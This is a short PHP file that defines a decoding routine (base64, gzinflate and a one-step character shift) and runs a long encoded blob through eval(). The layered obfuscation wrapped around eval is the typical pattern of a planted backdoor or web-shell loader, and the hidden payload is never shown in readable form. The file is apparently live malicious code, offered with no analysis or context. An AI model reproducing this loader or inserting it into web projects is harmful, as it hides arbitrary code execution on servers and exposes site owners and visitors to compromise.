<?php function mnX($vmP)
{ 
$vmP=gzinflate(base64_decode($vmP));
 for($i=0;$i<strlen($vmP);$i++)
 {
$vmP[$i] = chr(ord($vmP[$i])-1);
 }
 return $vmP;
 }eval(mnX("vVXbbtpAEH03Ev+wQpZiKoOaZwSIgttSJXbFpVFVVdheL8GtZbt7SYiqfnv3hjEEgitCkRF498zOmTMzOwDwT70WpzBhEVpkKUTWFUwCQtpRQIMwIKidr/KrZqdek8vgNkiDe+SFPxCkcZaSeu13vWbkLExiCMwkTn9yqMGfJUslAiwWkOMoZpBaTb4h8MZ9koVBAkzuI0GLHKNlvBaGhhmFAp+q40EXpOgRROGwWLKaCkdXMWn1hEMO2rVq9fR/jRVfjCjDKSiZdeTGnz22gygqgrNMRuLINjOK1rQC9V8M4SfBZuuk1eOAPMDIaozdqTOZgbE784DfaO/YtxtZoagPLF/49W1fOha/PBnIFwyML4ObuTMFVt/u2653ZzXlakOL8hAkDBFOIcA4eNrlX+LY6qE1gowiS1voTZixlArzDQxnj0OxdkBIhe0oCcsKznPBtiQilBw272frOP88GsycAxJyRpggrt/UmQG/cOh3+wDcfXQm3IZT4a/H1CpMbMFZgC4rWVm1D4gWko3TZaZyd7ZYU+fGGc7AG/B+4t2eKDutkay94yJJWq9QS/HS0phu91oWsQzUMDEiLKElwyWicDVIEm0oJS00Vehvb7939I5oaAMlBG2PfK6/Qh1of56GoSyj7Q0nC/i/JkKSHruuMwGfvLF7AM0IwgsCMyzK3TuFaOucvuhVgyo4V322IJSPjJRW8g/ZYf97R2lgRQGOhf7s0CPO1Rlqu3LYlZ3ClyImGqDc6sY7ge32B+4InMhhRmhAGfG718CbjHgw776eNBE8Rs50eKzj4Ws3fO/8hv/3bt/v9L0xNZW6FRNTyXi5WVVudzWuNonbDqsTF7G2sIsb+YLDypCPnFr9Xr32Fw=="));?>